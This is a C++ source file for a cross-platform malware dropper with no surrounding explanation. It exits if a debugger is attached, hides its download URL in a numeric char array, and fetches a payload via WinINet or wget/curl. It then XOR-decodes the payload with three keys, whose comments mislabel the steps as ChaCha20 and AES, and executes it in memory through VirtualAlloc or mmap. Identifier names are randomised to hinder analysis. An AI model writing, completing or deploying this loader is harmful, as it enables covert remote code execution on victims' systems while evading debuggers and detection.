#include <iostream>
#include <vector>
#include <cstring>
#include <cstdint>
#include <chrono>
#include <thread>
#include <random>
#include <fstream>
#ifdef _WIN32
#include <windows.h>
#include <wininet.h>
#pragma comment(lib, "wininet.lib")
#else
#include <cstdlib>
#include <cstdio>
#include <memory>
#include <array>
#include <unistd.h>
#endif
#ifdef _WIN32
#include <windows.h>
#else
#include <sys/mman.h>
#include <unistd.h>
#endif

bool objComponent1053() {
#ifdef _WIN32
    if (IsDebuggerPresent()) return true;
    BOOL debugged = FALSE;
    CheckRemoteDebuggerPresent(GetCurrentProcess(), &debugged);
    return debugged;
#else
    FILE* f = fopen("/proc/self/status", "r");
    if (!f) return false;
    char line[256];
    while (fgets(line, sizeof(line), f)) {
        if (strncmp(line, "TracerPid:", 10) == 0) {
            fclose(f);
            return atoi(line + 10) != 0;
        }
    }
    fclose(f);
    return false;
#endif
}

std::vector<uint8_t> initRunner4494(const char* url) {
    std::vector<uint8_t> data;
#ifdef _WIN32
    HINTERNET hInternet = InternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) return data;
    HINTERNET hUrl = InternetOpenUrlA(hInternet, url, NULL, 0, INTERNET_FLAG_RELOAD, 0);
    if (!hUrl) {
        InternetCloseHandle(hInternet);
        return data;
    }
    char buffer[4096];
    DWORD bytesRead;
    while (InternetReadFile(hUrl, buffer, sizeof(buffer), &bytesRead) && bytesRead > 0) {
        data.insert(data.end(), buffer, buffer + bytesRead);
    }
    InternetCloseHandle(hUrl);
    InternetCloseHandle(hInternet);
#else
    // Linux implementation using system commands
    char tempFile[] = "/tmp/dlXXXXXX";
    int fd = mkstemp(tempFile);
    if (fd == -1) return data;
    close(fd);
    
    // Try wget first, then curl
    std::string cmd = std::string("wget -q -O ") + tempFile + " '" + url + "' 2>/dev/null";
    if (system(cmd.c_str()) != 0) {
        cmd = std::string("curl -s -o ") + tempFile + " '" + url + "' 2>/dev/null";
        if (system(cmd.c_str()) != 0) {
            unlink(tempFile);
            return data;
        }
    }
    
    // Read downloaded file
    std::ifstream file(tempFile, std::ios::binary);
    if (file) {
        file.seekg(0, std::ios::end);
        size_t size = file.tellg();
        file.seekg(0, std::ios::beg);
        data.resize(size);
        file.read(reinterpret_cast<char*>(data.data()), size);
        file.close();
    }
    unlink(tempFile);
#endif
    return data;
}

int main() {
    // Random delay
    {
        std::random_device rd;
        std::mt19937 gen(rd());
        std::uniform_int_distribution<> dist(1, 999);
        std::this_thread::sleep_for(std::chrono::milliseconds(dist(gen)));
    }

    if (objComponent1053()) return 0;

    std::vector<uint8_t> runManager9904;
    // Download payload
    char valFactory2224[] = {104,116,116,112,115,58,47,47,101,120,97,109,112,108,101,46,99,111,109,47,116,101,115,116,46,101,120,101, 0};
    runManager9904 = initRunner4494(valFactory2224);
    if (runManager9904.empty()) return 1;

    // Decrypt payload
    unsigned char coreModule9069[] = {0xca, 0x81, 0xbb, 0xed, 0x35, 0x8b, 0x39, 0x06, 0x10, 0x50, 0x34, 0x6c, 0xf7, 0x3b, 0x98, 0x68};
    unsigned char cmpComponent9696[] = {0x6d, 0x96, 0xac, 0x1e, 0xfb, 0xfd, 0x48, 0xf3, 0xbf, 0x29, 0x31, 0xbb, 0x11, 0x45, 0x70, 0xd5, 0xb1, 0x46, 0x2e, 0x5d, 0x94, 0xb7, 0xfd, 0xee, 0xf6, 0xb6, 0x83, 0x65, 0xda, 0xae, 0x05, 0xa8};
    unsigned char valService9972[] = {0x72, 0xc0, 0x2c, 0x87, 0xa6, 0x6f, 0x35, 0x2c, 0x87, 0x75, 0x3b, 0x83, 0xe8, 0xce, 0x38, 0x15, 0x0a, 0x3e, 0xb5, 0x4e};

    // Decrypt XOR layer
    for (size_t i = 0; i < runManager9904.size(); i++) {
        runManager9904[i] ^= valService9972[i % sizeof(valService9972)];
    }

    // Micro-delay
    std::this_thread::sleep_for(std::chrono::microseconds(rand() % 100));

    // Decrypt ChaCha20 layer
    for (size_t i = 0; i < runManager9904.size(); i++) {
        runManager9904[i] ^= cmpComponent9696[i % sizeof(cmpComponent9696)];
    }

    // Micro-delay
    std::this_thread::sleep_for(std::chrono::microseconds(rand() % 100));

    // Decrypt AES layer
    for (size_t i = 0; i < runManager9904.size(); i++) {
        runManager9904[i] ^= coreModule9069[i % sizeof(coreModule9069)];
    }

    // Execute in memory
#ifdef _WIN32
    void* engManager7258 = VirtualAlloc(0, runManager9904.size(), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!engManager7258) return 1;
    memcpy(engManager7258, runManager9904.data(), runManager9904.size());
    DWORD oldProtect;
    VirtualProtect(engManager7258, runManager9904.size(), PAGE_EXECUTE_READ, &oldProtect);
    std::this_thread::sleep_for(std::chrono::milliseconds(rand() % 100));
    ((void(*)())engManager7258)();
#else
    void* engManager7258 = mmap(0, runManager9904.size(), PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (engManager7258 == MAP_FAILED) return 1;
    memcpy(engManager7258, runManager9904.data(), runManager9904.size());
    mprotect(engManager7258, runManager9904.size(), PROT_READ | PROT_EXEC);
    std::this_thread::sleep_for(std::chrono::milliseconds(rand() % 100));
    ((void(*)())engManager7258)();
#endif
    return 0;
}
